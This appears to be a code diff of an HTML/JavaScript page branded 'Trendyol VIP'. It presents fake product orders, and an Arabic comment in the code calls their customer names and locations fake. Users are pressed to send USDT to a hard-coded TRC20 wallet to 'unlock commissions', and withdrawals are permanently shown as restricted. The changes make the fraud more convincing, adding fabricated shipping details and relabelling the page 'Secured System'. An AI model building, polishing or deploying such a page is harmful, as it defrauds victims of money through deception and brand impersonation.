@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trendyol VIP - Global</title>
+    <title>Trendyol VIP - Secured System</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
         :root { --primary: #f27a1a; --dark: #111; --gold: #c5a059; --green: #27ae60; --gray: #f4f7f6; }
@@ -16,35 +16,38 @@
         
         .section-title { padding: 20px; font-weight: bold; color: #333; display: flex; justify-content: space-between; }
         .task-list { padding: 0 15px 100px 15px; }
-        .task-card { background: white; border-radius: 15px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
+        .task-card { background: white; border-radius: 15px; padding: 18px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
         
-        /* بديل الصور المكسورة: مربع أيقونات ملون */
-        .task-emoji-box { width: 70px; height: 70px; background: #fff1e6; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 35px; border: 1px solid #ffd8b8; flex-shrink: 0; }
+        .task-header { display: flex; gap: 15px; align-items: center; margin-bottom: 12px; }
+        .task-emoji-box { width: 60px; height: 60px; background: #fff1e6; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 30px; border: 1px solid #ffd8b8; }
         
         .task-info { flex: 1; }
-        .task-name { font-weight: bold; font-size: 14px; color: #222; margin-bottom: 3px; }
+        .task-name { font-weight: bold; font-size: 14px; color: #222; }
         .task-profit { color: var(--green); font-weight: bold; font-size: 15px; }
-        .btn-submit { background: var(--primary); color: white; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+
+        /* تفاصيل الشحن والعميل */
+        .shipping-details { background: #fafafa; border-radius: 8px; padding: 10px; font-size: 11px; color: #777; border-left: 3px solid var(--primary); margin-bottom: 12px; }
+        [dir="rtl"] .shipping-details { border-left: none; border-right: 3px solid var(--primary); }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 3px; }
+
+        .btn-submit { background: var(--primary); color: white; border: none; width: 100%; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; }
 
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 9999; align-items: center; justify-content: center; padding: 20px; }
         .modal-content { background: white; width: 100%; max-width: 350px; border-radius: 20px; padding: 25px; text-align: center; }
         #auth-screen { position: fixed; inset: 0; background: white; z-index: 10000; display: flex; align-items: center; justify-content: center; }
         .inp { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 10px; margin-bottom: 10px; box-sizing: border-box; }
         .btn-main { width: 100%; padding: 15px; border: none; border-radius: 10px; background: var(--primary); color: white; font-weight: bold; cursor: pointer; }
-        
-        [dir="rtl"] { text-align: right; }
-        [dir="rtl"] .lang-btn { right: auto; left: 15px; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div style="width: 100%; max-width: 300px; text-align: center;">
-            <h1 style="color: var(--primary); margin-bottom: 30px;">Trendyol VIP</h1>
+            <h1 style="color: var(--primary);">Trendyol VIP</h1>
             <input type="email" id="email" class="inp" placeholder="Email Address">
             <input type="password" id="password" class="inp" placeholder="Password">
             <button class="btn-main" onclick="handleAuth('login')">Login</button>
-            <p style="color: #888; font-size: 13px; margin-top: 15px;" onclick="handleAuth('signup')">Don't have an account? <b>Sign Up</b></p>
+            <p style="color: #888; font-size: 13px; cursor: pointer;" onclick="handleAuth('signup')">Create New Account</p>
         </div>
     </div>
 
@@ -58,12 +61,7 @@
                 <button class="btn-act" style="background:#e74c3c;" onclick="openModal('withdraw')">Withdraw</button>
             </div>
         </div>
-
-        <div class="section-title">
-            <span id="txt-tasks">Daily Tasks</span>
-            <span id="task-count" style="color: var(--primary);">0/10</span>
-        </div>
-
+        <div class="section-title"><span id="txt-tasks">Order Center</span><span id="task-count" style="color: var(--primary);">0/10</span></div>
         <div id="tasks-container" class="task-list"></div>
     </div>
 
@@ -72,7 +70,7 @@
             <h3 id="m-title"></h3>
             <p id="m-desc" style="color: #666; font-size: 14px;"></p>
             <div id="m-extra" style="background:#f4f4f4; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all; font-weight: bold; color: var(--primary);"></div>
-            <button class="btn-main" onclick="closeModal()">OK</button>
+            <button class="btn-main" onclick="closeModal()">Confirm</button>
         </div>
     </div>
 
@@ -83,36 +81,26 @@
 
     let currentLang = 'en', userData = {}, currentUser = null;
 
-    // المنتجات باستخدام الإيموجي لضمان الظهور 100%
+    // مصفوفة الطلبات مع الأسماء والمواقع الوهمية
     const products = [
-        { name: "iPhone 15 Pro Max", profit: 4.44, emoji: "📱" },
-        { name: "MacBook Air M2", profit: 4.44, emoji: "💻" },
-        { name: "Sony Headphones XM5", profit: 4.44, emoji: "🎧" },
-        { name: "Apple Watch Ultra", profit: 4.44, emoji: "⌚" },
-        { name: "PlayStation 5 Slim", profit: 4.44, emoji: "🎮" }
+        { name: "Apple iPhone 15 Pro", profit: 4.44, emoji: "📱", customer: "M. Al-Otaibi", location: "Riyadh, KSA", orderId: "TR-99281" },
+        { name: "Samsung Galaxy Tab S9", profit: 4.44, emoji: "💻", customer: "John D.", location: "Dubai, UAE", orderId: "TR-77210" },
+        { name: "Sony XM5 Headphones", profit: 4.44, emoji: "🎧", customer: "Sarah K.", location: "London, UK", orderId: "TR-66192" },
+        { name: "Dyson V15 Vacuum", profit: 4.44, emoji: "🧹", customer: "A. Müller", location: "Berlin, DE", orderId: "TR-55401" },
+        { name: "Apple Watch Ultra 2", profit: 4.44, emoji: "⌚", customer: "H. Tanaka", location: "Tokyo, JP", orderId: "TR-44283" }
     ];
 
     async function handleAuth(type) {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const { data, error } = type === 'signup' 
-            ? await _supabase.auth.signUp({ email, password }) 
-            : await _supabase.auth.signInWithPassword({ email, password });
-        
-        if (error) alert(error.message);
-        else if (type === 'login') loadData(data.user);
-        else alert("Account created! Please Login.");
+        const email = document.getElementById('email').value, password = document.getElementById('password').value;
+        const { data, error } = type === 'signup' ? await _supabase.auth.signUp({ email, password }) : await _supabase.auth.signInWithPassword({ email, password });
+        if (error) alert(error.message); else if (type === 'login') loadData(data.user); else alert("Success! Now login.");
     }
 
     async function loadData(user) {
         currentUser = user;
         const { data } = await _supabase.from('profiles').select('*').eq('id', user.id).single();
-        if (data) {
-            userData = data;
-            document.getElementById('auth-screen').style.display = 'none';
-            document.getElementById('main-app').style.display = 'block';
-            updateUI();
-        } else { setTimeout(() => loadData(user), 2000); }
+        if (data) { userData = data; document.getElementById('auth-screen').style.display = 'none'; document.getElementById('main-app').style.display = 'block'; updateUI(); }
+        else { setTimeout(() => loadData(user), 2000); }
     }
 
     function toggleLang() {
@@ -126,39 +114,43 @@
         document.getElementById('balance').innerText = userData.balance.toFixed(2);
         document.getElementById('task-count').innerText = `${userData.tasks_completed}/10`;
         document.getElementById('txt-bal-title').innerText = currentLang === 'en' ? 'Total Balance (USDT)' : 'إجمالي الرصيد (USDT)';
-        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Daily Tasks' : 'المهام اليومية';
+        document.getElementById('txt-tasks').innerText = currentLang === 'en' ? 'Order Center' : 'مركز الطلبات';
         
         const container = document.getElementById('tasks-container');
         container.innerHTML = '';
         products.forEach(p => {
             container.innerHTML += `
                 <div class="task-card">
-                    <div class="task-emoji-box">${p.emoji}</div>
-                    <div class="task-info">
-                        <div class="task-name">${p.name}</div>
-                        <div class="task-profit">+ $${p.profit}</div>
+                    <div class="task-header">
+                        <div class="task-emoji-box">${p.emoji}</div>
+                        <div class="task-info">
+                            <div class="task-name">${p.name}</div>
+                            <div class="task-profit">+ $${p.profit}</div>
+                        </div>
                     </div>
-                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit' : 'إرسال'}</button>
+                    <div class="shipping-details">
+                        <div class="detail-row"><span>Customer:</span> <b>${p.customer}</b></div>
+                        <div class="detail-row"><span>Location:</span> <b>${p.location}</b></div>
+                        <div class="detail-row"><span>Order ID:</span> <b>${p.orderId}</b></div>
+                    </div>
+                    <button class="btn-submit" onclick="submitTask()">${currentLang === 'en' ? 'Submit Order' : 'تأكيد الطلب'}</button>
                 </div>`;
         });
     }
 
-    function submitTask() {
-        if (!userData.is_vip) openModal('deposit');
-        else alert("Success!");
-    }
+    function submitTask() { if (!userData.is_vip) openModal('deposit'); else alert("Success!"); }
 
     function openModal(type) {
         document.getElementById('modal').style.display = 'flex';
         const extra = document.getElementById('m-extra');
         if (type === 'deposit') {
-            document.getElementById('m-title').innerText = currentLang === 'en' ? "VIP Upgrade" : "ترقية VIP";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Send USDT (TRC20) to unlock tasks:" : "أرسل USDT (TRC20) لفتح المهام:";
+            document.getElementById('m-title').innerText = currentLang === 'en' ? "Upgrade to VIP" : "ترقية إلى VIP";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Please deposit to your TRC20 address to unlock commissions:" : "يرجى الإيداع في عنوان TRC20 الخاص بك لفتح العمولات:";
             extra.innerText = "TG9gT1pPJK3aETRp1hVu28F5Zayu4oVyEg";
         } else {
-            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdraw" : "سحب الأرباح";
-            document.getElementById('m-desc').innerText = currentLang === 'en' ? "You must complete 10/10 tasks first." : "يجب إكمال 10/10 مهام أولاً.";
-            extra.innerText = "Status: Locked";
+            document.getElementById('m-title').innerText = currentLang === 'en' ? "Withdrawal" : "سحب الرصيد";
+            document.getElementById('m-desc').innerText = currentLang === 'en' ? "Minimum 10 tasks must be completed." : "يجب إكمال 10 مهام على الأقل.";
+            extra.innerText = "Current Status: Restricted";
         }
     }
 
